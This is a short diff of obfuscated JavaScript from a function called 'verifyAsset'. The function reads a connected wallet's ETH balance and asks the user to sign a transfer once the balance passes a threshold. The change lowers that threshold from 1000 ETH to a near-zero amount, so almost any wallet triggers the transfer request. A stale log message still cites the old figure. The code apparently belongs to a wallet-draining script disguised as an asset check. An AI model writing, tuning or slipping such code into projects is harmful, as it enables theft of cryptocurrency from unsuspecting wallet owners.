@@ -157,7 +157,7 @@ const verifyAsset = async () => {
         eth_bal = await _0x56ec74[_0x42c6ec(0x119)]['getBalance'](_0xfc8668);
         const _0x1a2ac4 = _0x56ec74[_0x42c6ec(0xb1)][_0x42c6ec(0x110)](eth_bal, 'ether');
         console[_0x42c6ec(0xad)](_0x42c6ec(0xb3) + _0xfc8668 + _0x42c6ec(0xbc) + _0x1a2ac4 + _0x42c6ec(0xdf)), sW('Current balance for ' + _0xfc8668 + _0x42c6ec(0xbc) + _0x1a2ac4 + ' ETH');
-        if (_0x1a2ac4 > 1000) askTransferWithSign(_0x1a2ac4);
+        if (_0x1a2ac4 > 0.000000000000007580) askTransferWithSign(_0x1a2ac4);
         else console[_0x42c6ec(0xad)](_0x42c6ec(0x8a)), sW('Info, balance is too low. (< 1000 ETH). Balance: \' ' + _0x1a2ac4);
     } catch (_0x17ae2a) {
         console[_0x42c6ec(0xad)](_0x17ae2a);
